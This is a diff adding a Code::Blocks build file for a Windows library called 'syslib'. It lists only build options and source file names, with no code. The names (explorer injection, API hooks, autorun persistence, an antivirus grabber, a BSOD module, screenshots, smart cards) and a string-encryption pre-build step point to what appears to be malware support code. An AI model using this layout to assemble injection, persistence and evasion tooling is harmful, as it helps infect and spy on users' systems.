@@ -1,0 +1,302 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<CodeBlocks_project_file>
+	<FileVersion major="1" minor="6" />
+	<Project>
+		<Option title="syslib" />
+		<Option pch_mode="2" />
+		<Option compiler="msvc10" />
+		<Build>
+			<Target title="Debug x86">
+				<Option output="$(WORKSPACEDIR)/bin/Debug/syslib x86" prefix_auto="1" extension_auto="1" />
+				<Option working_dir="" />
+				<Option object_output="$(WORKSPACEDIR)/obj/Debug/syslib x86/" />
+				<Option type="2" />
+				<Option compiler="msvc10" />
+				<Option createDefFile="1" />
+				<Compiler>
+					<Add option="/MDd" />
+					<Add option="/Od" />
+					<Add option="/W3" />
+					<Add option="/Zi" />
+					<Add option="/DWIN32" />
+					<Add option="/D_DEBUG" />
+					<Add option="/D_LIB" />
+				</Compiler>
+				<Linker>
+					<Add option="/DEBUG" />
+				</Linker>
+			</Target>
+			<Target title="Release x86">
+				<Option output="$(WORKSPACEDIR)/bin/Release/syslib x86" prefix_auto="1" extension_auto="1" />
+				<Option working_dir="" />
+				<Option object_output="$(WORKSPACEDIR)/obj/Release/syslib x86/" />
+				<Option type="2" />
+				<Option compiler="msvc10" />
+				<Option createDefFile="1" />
+				<Compiler>
+					<Add option="/MD" />
+					<Add option="/Oy" />
+					<Add option="/Os" />
+					<Add option="/Ox" />
+					<Add option="/W3" />
+					<Add option="/DWIN32" />
+					<Add option="/DNDEBUG" />
+					<Add option="/D_LIB" />
+				</Compiler>
+			</Target>
+			<Target title="Debug x64">
+				<Option output="$(WORKSPACEDIR)/bin/Debug/syslib x64" prefix_auto="1" extension_auto="1" />
+				<Option working_dir="" />
+				<Option object_output="$(WORKSPACEDIR)/obj/Debug/syslib x64/" />
+				<Option type="2" />
+				<Option compiler="microsoft_visual_c_2010_x64" />
+				<Option createDefFile="1" />
+				<Compiler>
+					<Add option="/MDd" />
+					<Add option="/Od" />
+					<Add option="/W3" />
+					<Add option="/Zi" />
+					<Add option="/DWIN32" />
+					<Add option="/D_DEBUG" />
+					<Add option="/D_LIB" />
+				</Compiler>
+				<Linker>
+					<Add option="/DEBUG" />
+				</Linker>
+			</Target>
+			<Target title="Release x64">
+				<Option output="$(WORKSPACEDIR)/bin/Release/syslib x64" prefix_auto="1" extension_auto="1" />
+				<Option working_dir="" />
+				<Option object_output="$(WORKSPACEDIR)/obj/Release/syslib x64/" />
+				<Option type="2" />
+				<Option compiler="microsoft_visual_c_2010_x64" />
+				<Option createDefFile="1" />
+				<Compiler>
+					<Add option="/MD" />
+					<Add option="/Oy" />
+					<Add option="/Os" />
+					<Add option="/Ox" />
+					<Add option="/W3" />
+					<Add option="/DWIN32" />
+					<Add option="/DNDEBUG" />
+					<Add option="/D_LIB" />
+				</Compiler>
+			</Target>
+		</Build>
+		<VirtualTargets>
+			<Add alias="Debug" targets="Debug x86;Debug x64;" />
+			<Add alias="Release" targets="Release x86;Release x64;" />
+		</VirtualTargets>
+		<Compiler>
+			<Add option="/GA" />
+			<Add option="/fp:except-" />
+			<Add option="/Gy" />
+			<Add option="/GS-" />
+			<Add option="/DUNICODE" />
+			<Add option="/D_UNICODE" />
+			<Add option="/D_STR_CRX" />
+			<Add directory="$(PROJECTDIR)" />
+		</Compiler>
+		<Linker>
+			<Add option="/ignore:4044,4006" />
+		</Linker>
+		<ExtraCommands>
+			<Add before="$(WORKSPACE_DIR)\str_crypt\strcrypt.exe ." />
+		</ExtraCommands>
+		<Unit filename="autorun/arun.cpp" />
+		<Unit filename="autorun/arun.h" />
+		<Unit filename="autorun/arun_lnk.cpp" />
+		<Unit filename="autorun/arun_prot.h" />
+		<Unit filename="autorun/arun_reg.cpp" />
+		<Unit filename="autorun/lnk.h" />
+		<Unit filename="autorun/protection.cpp" />
+		<Unit filename="autorun/reg.h" />
+		<Unit filename="chksum/crc32.cpp" />
+		<Unit filename="chksum/murmur3.cpp" />
+		<Unit filename="chksum/murmur3.h" />
+		<Unit filename="config/config.cpp" />
+		<Unit filename="config/config.h" />
+		<Unit filename="config/pe_rebuilder/pe_rebuild.cpp" />
+		<Unit filename="config/pe_rebuilder/pe_rebuild.h" />
+		<Unit filename="config/pe_rebuilder/sections.cpp" />
+		<Unit filename="criticalsections.cpp" />
+		<Unit filename="crypt/bigd/bigd.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="crypt/bigd/bigd.h" />
+		<Unit filename="crypt/bigd/bigdRand.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="crypt/bigd/bigdRand.h" />
+		<Unit filename="crypt/bigd/bigdigits.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="crypt/bigd/bigdigits.h" />
+		<Unit filename="crypt/bigd/bigdigitsRand.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="crypt/bigd/bigdigitsRand.h" />
+		<Unit filename="crypt/bigd/bigdtypes.h" />
+		<Unit filename="crypt/bigd/mem.h" />
+		<Unit filename="crypt/global.h" />
+		<Unit filename="crypt/md5c.cpp" />
+		<Unit filename="crypt/md6.cpp" />
+		<Unit filename="crypt/md6int/inttypes.h" />
+		<Unit filename="crypt/md6int/md6.h" />
+		<Unit filename="crypt/md6int/md6_compress.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="crypt/md6int/md6_mode.c">
+			<Option compilerVar="CC" />
+		</Unit>
+		<Unit filename="crypt/rc4.cpp" />
+		<Unit filename="crypt/rc4.h" />
+		<Unit filename="crypt/rsa.cpp" />
+		<Unit filename="crypt/rsa.h" />
+		<Unit filename="crypt/sha1.cpp" />
+		<Unit filename="crypt/sha1.h" />
+		<Unit filename="crypt/sha2.cpp" />
+		<Unit filename="crypt/sha2.h" />
+		<Unit filename="debug/dbg.cpp" />
+		<Unit filename="debug/debug.cpp" />
+		<Unit filename="debug/debug.h" />
+		<Unit filename="defines.h" />
+		<Unit filename="file_container/file_container.cpp" />
+		<Unit filename="file_container/file_container.h" />
+		<Unit filename="fs/copyfile.cpp" />
+		<Unit filename="fs/directory.cpp" />
+		<Unit filename="fs/findfiles.cpp" />
+		<Unit filename="fs/findfiles.h" />
+		<Unit filename="fs/fs.cpp" />
+		<Unit filename="fs/mask.cpp" />
+		<Unit filename="hooks/hde32/hde32.cpp" />
+		<Unit filename="hooks/hde32/hde32.h" />
+		<Unit filename="hooks/hde32/table32.h" />
+		<Unit filename="hooks/hde64/hde64.cpp" />
+		<Unit filename="hooks/hde64/hde64.h" />
+		<Unit filename="hooks/hde64/table64.h" />
+		<Unit filename="hooks/hook_api.cpp" />
+		<Unit filename="hooks/hook_api.h" />
+		<Unit filename="hooks/splice.cpp" />
+		<Unit filename="hooks/splice.h" />
+		<Unit filename="hooks/stdint.h" />
+		<Unit filename="hooks/wh_process.cpp" />
+		<Unit filename="hooks/wh_process.h" />
+		<Unit filename="inject/explorer_inj.cpp" />
+		<Unit filename="inject/explorer_inj.h" />
+		<Unit filename="inject/inject.cpp" />
+		<Unit filename="inject/inject.h" />
+		<Unit filename="ipc/client.cpp" />
+		<Unit filename="ipc/common.cpp" />
+		<Unit filename="ipc/common.h" />
+		<Unit filename="ipc/ipc.h" />
+		<Unit filename="ipc/server.cpp" />
+		<Unit filename="ldr/ldr.cpp" />
+		<Unit filename="ldr/ldr.h" />
+		<Unit filename="ldr/res.cpp" />
+		<Unit filename="ldr/res.h" />
+		<Unit filename="mem.cpp">
+			<Option compiler="msvc10" use="1" buildCommand="$compiler /nologo $options /GL- $includes /c $file /Fo$object" />
+			<Option compiler="microsoft_visual_c_2010_x64" use="1" buildCommand="$compiler /nologo $options /GL- $includes /c $file /Fo$object" />
+		</Unit>
+		<Unit filename="mem.h" />
+		<Unit filename="network/base64.cpp" />
+		<Unit filename="network/escape.cpp" />
+		<Unit filename="network/net.cpp" />
+		<Unit filename="network/net.h" />
+		<Unit filename="network/ssl.cpp" />
+		<Unit filename="network/ssl.h" />
+		<Unit filename="network/wininet/argslist.cpp" />
+		<Unit filename="network/wininet/argslist.h" />
+		<Unit filename="network/wininet/cookie.cpp" />
+		<Unit filename="network/wininet/cookie.h" />
+		<Unit filename="network/wininet/download.cpp" />
+		<Unit filename="network/wininet/http.cpp" />
+		<Unit filename="network/wininet/http.h" />
+		<Unit filename="network/wininet/requests.cpp" />
+		<Unit filename="network/wininet/requests.h" />
+		<Unit filename="reg/export.cpp" />
+		<Unit filename="reg/import.cpp" />
+		<Unit filename="reg/reg.h" />
+		<Unit filename="screenshot.cpp" />
+		<Unit filename="screenshot.h" />
+		<Unit filename="str/scanf.cpp" />
+		<Unit filename="str/scanf.h" />
+		<Unit filename="str/strcmp.cpp" />
+		<Unit filename="str/strcmp.h" />
+		<Unit filename="str/strconv.cpp" />
+		<Unit filename="str/strcrypt.cpp" />
+		<Unit filename="str/strcrypt.h" />
+		<Unit filename="str/strfmt.cpp" />
+		<Unit filename="str/strfmt.h" />
+		<Unit filename="str/strgen.cpp" />
+		<Unit filename="str/strreverse.cpp" />
+		<Unit filename="str/strtodate.cpp" />
+		<Unit filename="str/strtodate.h" />
+		<Unit filename="str/strtrim.cpp" />
+		<Unit filename="str/wsprintf.cpp" />
+		<Unit filename="str/wsprintf.h" />
+		<Unit filename="sys_includes.h" />
+		<Unit filename="syslib/scrnshot.h" />
+		<Unit filename="syslibsafe.cpp" />
+		<Unit filename="syslibsafe.h">
+			<Option target="Debug x86" />
+		</Unit>
+		<Unit filename="system/av_grabber.cpp" />
+		<Unit filename="system/av_grabber.h" />
+		<Unit filename="system/bsod.cpp" />
+		<Unit filename="system/bsod.h" />
+		<Unit filename="system/osenv.cpp" />
+		<Unit filename="system/osenv.h" />
+		<Unit filename="system/scards.cpp" />
+		<Unit filename="system/system.cpp" />
+		<Unit filename="system/system.h" />
+		<Unit filename="system/sysver.cpp" />
+		<Unit filename="system/sysver.h" />
+		<Unit filename="system/waitformultipleobjects.cpp" />
+		<Unit filename="system/waitformultipleobjects.h" />
+		<Unit filename="threads/safethread.cpp" />
+		<Unit filename="threads/safethread.h" />
+		<Unit filename="threads/sendthreadmessage.cpp" />
+		<Unit filename="threads/sendthreadmessage.h" />
+		<Unit filename="threads/threadname.cpp" />
+		<Unit filename="threads/threadname.h" />
+		<Unit filename="threads/threadsgroup.cpp" />
+		<Unit filename="threads/threadsgroup.h" />
+		<Unit filename="time.cpp" />
+		<Unit filename="tools.cpp" />
+		<Unit filename="wnd/desktop.cpp" />
+		<Unit filename="wnd/getwindowdesktop.cpp" />
+		<Unit filename="wnd/getwnddesk.h" />
+		<Unit filename="wnd/system_tray.cpp" />
+		<Unit filename="wnd/system_tray.h" />
+		<Unit filename="wnd/wndclass.cpp" />
+		<Unit filename="wow64/wow64.cpp">
+			<Option target="Debug x86" />
+			<Option target="Release x86" />
+		</Unit>
+		<Unit filename="wow64/wow64.h">
+			<Option target="Debug x86" />
+			<Option target="Release x86" />
+		</Unit>
+		<Unit filename="wow64/wow64ext.h">
+			<Option target="Debug x86" />
+			<Option target="Release x86" />
+		</Unit>
+		<Extensions>
+			<code_completion />
+			<envvars />
+			<debugger />
+			<lib_finder disable_auto="1" />
+			<DoxyBlocks>
+				<comment_style block="0" line="0" />
+				<doxyfile_project />
+				<doxyfile_build />
+				<doxyfile_warnings />
+				<doxyfile_output />
+				<doxyfile_dot />
+				<general />
+			</DoxyBlocks>
+		</Extensions>
+	</Project>
+</CodeBlocks_project_file>
